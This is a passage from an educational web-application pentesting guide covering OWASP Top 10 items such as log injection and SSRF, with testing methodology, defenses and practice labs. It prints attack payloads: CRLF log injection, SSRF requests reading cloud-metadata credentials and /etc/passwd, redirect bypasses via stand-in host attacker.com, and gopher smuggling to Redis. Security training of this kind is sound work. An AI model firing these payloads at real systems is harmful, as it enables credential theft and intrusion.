git-dumper http://target.com/.git/ output/

# Exposed CI/CD configs
http://target.com/.gitlab-ci.yml
http://target.com/.github/workflows/
http://target.com/Jenkinsfile
http://target.com/.circleci/config.yml

# Secrets in repositories
trufflehog git https://github.com/target/repo
gitleaks detect --source .
```

**4. Dependency Confusion**
```bash
# Upload malicious package with same name to public registry
# Internal package manager pulls from public instead of private
# Malicious code executes during installation
```

**5. Supply Chain Attacks**
```bash
# Compromised dependencies
# Typosquatting packages
# Malicious npm/pip packages
```

---

## A09:2021 - Security Logging and Monitoring Failures

### Description
Insufficient logging and monitoring allowing attacks to go undetected.

### Common Failures

**1. No Logging**
```bash
# No logs for:
- Failed login attempts
- Privilege escalation attempts
- SQL injection attempts
- File access attempts
- Admin actions
```

**2. Insufficient Log Data**
```bash
# Missing information:
- Timestamp
- User ID
- IP address
- User agent
- Request parameters
- Response status
```

**3. No Alerting**
```bash
# No alerts for:
- Multiple failed logins
- Unusual access patterns
- Large data exports
- Configuration changes
- New admin accounts
```

**4. Log Injection**
```bash
# Inject fake log entries
username=admin%0A[2024-01-01] Successful login: admin

# CRLF injection in logs
username=admin%0D%0A[CRITICAL] System compromised

# Log poisoning for XSS
username=<script>alert(1)</script>
```

**5. Exposed Logs**
```bash
# Publicly accessible logs
http://target.com/logs/
http://target.com/error.log
http://target.com/access.log
http://target.com/debug.log
```

---

## A10:2021 - Server-Side Request Forgery (SSRF)

*Note: SSRF is new to the Top 10 in 2021, reflecting the increasing importance of cloud infrastructure security.*

### Description
Attacker tricks server into making requests to unintended locations.

### Basic SSRF

**Internal Network Scanning:**
```bash
# Scan internal IPs
http://target.com/fetch?url=http://127.0.0.1:80
http://target.com/fetch?url=http://127.0.0.1:22
http://target.com/fetch?url=http://127.0.0.1:3306
http://target.com/fetch?url=http://192.168.1.1
http://target.com/fetch?url=http://10.0.0.1
http://target.com/fetch?url=http://172.16.0.1
```

**Cloud Metadata:**
```bash
# AWS
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/
http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**File Access:**
```bash
# Local files
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///c:/windows/win.ini
http://target.com/fetch?url=file:///proc/self/environ
```

**Bypass Techniques:**
```bash
# IP encoding
http://127.0.0.1 → http://2130706433 (decimal)
http://127.0.0.1 → http://0x7f000001 (hex)
http://127.0.0.1 → http://0177.0.0.1 (octal)

# DNS rebinding
http://target.com/fetch?url=http://attacker-dns.com

# URL parser confusion
http://target.com/fetch?url=http://attacker.com@127.0.0.1
http://target.com/fetch?url=http://127.0.0.1#@attacker.com

# Protocol smuggling
http://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value
http://target.com/fetch?url=dict://127.0.0.1:6379/info

# Redirect bypass
# Host malicious redirect on attacker.com
http://target.com/fetch?url=http://attacker.com/redirect.php
```

---

## Testing Methodology

### 1. Reconnaissance
```bash
# Identify technologies
whatweb http://target.com
wappalyzer

# Find subdomains
subfinder -d target.com
amass enum -d target.com

# Directory enumeration
gobuster dir -u http://target.com -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

### 2. Vulnerability Scanning
```bash
# Automated scanners
nikto -h http://target.com
nuclei -u http://target.com
zap-cli quick-scan http://target.com

# Manual testing with Burp Suite
# Intercept requests
# Modify parameters
# Test for vulnerabilities
```

### 3. Exploitation
```bash
# Use appropriate tools and techniques
# Document findings
# Capture proof of concept
# Assess impact
```

### 4. Reporting
```bash
# Include:
- Vulnerability description
- Affected URLs/parameters
- Steps to reproduce
- Proof of concept
- Impact assessment
- Remediation recommendations
```

---

## Defense Mechanisms

### Input Validation
```bash
# Whitelist approach
# Sanitize user input
# Use parameterized queries
# Encode output
# Validate file uploads
```

### Authentication & Authorization
```bash
# Strong password policy
# Multi-factor authentication
# Session management
# Principle of least privilege
# Regular access reviews
```

### Encryption
```bash
# Use TLS 1.2+
# Strong cipher suites
# HSTS headers
# Encrypt sensitive data at rest
# Secure key management
```

### Security Headers
```bash
# Implement all security headers
# Content Security Policy
# X-Frame-Options
# X-Content-Type-Options
# Strict-Transport-Security
```

### Logging & Monitoring
```bash
# Log all security events
# Real-time monitoring
# Automated alerting
# Regular log review
# SIEM integration
```

---

## Practice Resources

### Vulnerable Applications
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - OWASP WebGoat
- **Juice Shop** - OWASP Juice Shop
- **bWAPP** - Buggy Web Application
- **Mutillidae** - OWASP Mutillidae
- **HackTheBox** - Web challenges
- **TryHackMe** - Web security rooms
- **PortSwigger Academy** - Free web security labs

### Tools
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Web application scanner
- **SQLMap** - SQL injection automation
- **Nikto** - Web server scanner
- **Nuclei** - Vulnerability scanner
- **Wfuzz** - Web application fuzzer
- **Gobuster** - Directory/file brute forcing
- **Sublist3r** - Subdomain enumeration

### Learning Resources
- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports
- Bugcrowd University
- PentesterLab
- Web Security Academy by PortSwigger

---

## Key Takeaways

1. **Always test with authorization** - Get written permission before testing
2. **Start with reconnaissance** - Understand the target before attacking
3. **Use automation wisely** - Combine automated tools with manual testing
4. **Document everything** - Keep detailed notes of findings
5. **Understand the impact** - Know the business impact of vulnerabilities
6. **Stay updated** - New vulnerabilities are discovered regularly
7. **Practice legally** - Use intentionally vulnerable applications
8. **Think like an attacker** - Understand attacker mindset and techniques
9. **Defense in depth** - Multiple layers of security controls
10. **Continuous learning** - Web security is constantly evolving

---

**Disclaimer:** This guide is for educational purposes only. Always obtain proper authorization before testing any system. Unauthorized access to computer systems is illegal and unethical.